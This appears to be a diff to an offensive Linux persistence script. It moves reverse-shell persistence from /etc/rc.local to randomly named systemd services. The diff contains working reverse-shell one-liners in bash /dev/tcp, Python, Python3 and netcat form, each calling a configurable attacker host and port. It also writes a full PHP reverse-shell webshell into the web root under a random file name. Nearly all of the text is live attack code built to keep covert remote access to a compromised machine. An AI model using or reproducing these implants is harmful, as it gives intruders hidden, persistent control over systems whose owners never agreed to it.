@@ -2,8 +2,6 @@
 
 attackBox=0.0.0.0
 attackPort=5253
-cron="* * * * *"
-php_webshell=$(strings /dev/urandom | grep ^[A-Za-z0-9]*$ | head -n 1)
 
 if [ "$EUID" -eq 0 ];
 then
@@ -35,14 +33,6 @@ then
 	php="yes"
 fi
 
-if [ ! -f "/etc/rc.local" ];
-then
-	rclocal="no"
-elif [ -f "/etc/rc.local" ];
-then
-	rclocal="yes"
-fi
-
 if $(env | grep -qi "HOME")
 then
 	home="yes"
@@ -51,11 +41,17 @@ fi
 if $(which crontab | grep -qi crontab)
 then
 	crontab="yes"
+	cron="* * * * *"
 fi
 
 if $(which systemctl | grep -qi systemctl)
 then
 	systemctl="yes"
+	export php_webshell=$(strings /dev/urandom | grep ^[A-Za-z0-9]*$ | head -n 1).php
+	export bash_rev_shell_service=$(strings /dev/urandom | grep ^[A-Za-z0-9]*$ | head -n 1).service
+	export python_rev_shell_service=$(strings /dev/urandom | grep ^[A-Za-z0-9]*$ | head -n 1).service
+	export python3_rev_shell_service=$(strings /dev/urandom | grep ^[A-Za-z0-9]*$ | head -n 1).service
+	export netcat_rev_shell_service=$(strings /dev/urandom | grep ^[A-Za-z0-9]*$ | head -n 1).service
 fi
 
 if [ "$crontab" == "yes" ];
@@ -111,39 +107,62 @@ fi
 
 if [ "$root" == "yes" ];
 then
-	if [ "$rclocal" == "no" ];
+	if [ "$systemctl" == "yes" ];
 	then
-		echo "/bin/sh -e" > /etc/rc.local
-		echo "exit 0" >> /etc/rc.local
-		rclocal="yes"
-	fi
-	if [ "$rclocal" == "yes" ];
-	then
-		grep -v "exit 0" /etc/rc.local > /dev/shm/.rc.local.tmp
 		if [ "$bash" == "yes" ];
 		then
-			echo "bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1' 2> /dev/null & sleep .0001" >> /dev/shm/.rc.local.tmp
-			echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in /etc/rc.local"
+			echo "[Service]
+Type=oneshot
+ExecStartPre=$(which sleep) 60
+ExecStart=$(which bash) -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1' 2> /dev/null & sleep .0001
+[Install]
+WantedBy=multi-user.target" > /etc/systemd/system/$bash_rev_shell_service
+			chmod 644 /etc/systemd/system/$bash_rev_shell_service
+			systemctl start $bash_rev_shell_service 2> /dev/null & sleep .0001
+			systemctl enable $bash_rev_shell_service 2> /dev/null & sleep .0001
+			echo -e "\e[92m[+]\e[0m Bash reverse shell installed as a service at /etc/systemd/system/$bash_rev_shell_service"
+
 		fi
 		if [ "$python" == "yes" ];
 		then
-			echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> /dev/shm/.rc.local.tmp
-			echo -e "\e[92m[+]\e[0m Python reverse shell loaded in /etc/rc.local"
+			echo "[Service]
+Type=oneshot
+ExecStartPre=$(which sleep) 60
+ExecStart=$(which python) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001
+[Install]
+WantedBy=multi-user.target" > /etc/systemd/system/$python_rev_shell_service
+			chmod 644 /etc/systemd/system/$python_rev_shell_service
+			systemctl start $python_rev_shell_service 2> /dev/null & sleep .0001
+			systemctl enable $python_rev_shell_service 2> /dev/null & sleep .0001
+			echo -e "\e[92m[+]\e[0m Python reverse shell installed as a service at /etc/systemd/system/$python_rev_shell_service"
 		fi
 		if [ "$python3" == "yes" ];
 		then
-			echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> /dev/shm/.rc.local.tmp
-			echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in /etc/rc.local"
+			echo "[Service]
+Type=oneshot
+ExecStartPre=$(which sleep) 60
+ExecStart=$(which python3) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001
+[Install]
+WantedBy=multi-user.target" > /etc/systemd/system/$python3_rev_shell_service
+			chmod 644 /etc/systemd/system/$python3_rev_shell_service
+			systemctl start $python3_rev_shell_service 2> /dev/null & sleep .0001
+			systemctl enable $python3_rev_shell_service 2> /dev/null & sleep .0001
+			echo -e "\e[92m[+]\e[0m Python3 reverse shell installed as a service at /etc/systemd/system/$python3_rev_shell_service"
 		fi
 		if [ "$nc" == "yes" ];
 		then
-			echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/.rc.local.tmp
-			echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in /etc/rc.local"
+			echo "[Service]
+Type=oneshot
+ExecStartPre=$(which sleep) 60
+ExecStart=$(which nc) $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001
+[Install]
+WantedBy=multi-user.target" > /etc/systemd/system/$netcat_rev_shell_service
+			chmod 644 /etc/systemd/system/$netcat_rev_shell_service
+			systemctl start $netcat_rev_shell_service 2> /dev/null & sleep .0001
+			systemctl enable $netcat_rev_shell_service 2> /dev/null & sleep .0001
+			echo -e "\e[92m[+]\e[0m Netcat reverse shell installed as a service at /etc/systemd/system/$netcat_rev_shell_service"
 		fi
 	fi
-	echo "exit 0" >> /dev/shm/.rc.local.tmp
-	mv /dev/shm/.rc.local.tmp /etc/rc.local
-	chmod +x /etc/rc.local
 	if [ "$php" == "yes" ];
 	then 
 		echo "<?php set_time_limit (0);\$ip = '$attackBox';\$port = $attackPort;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > /var/www/html/$php_webshell
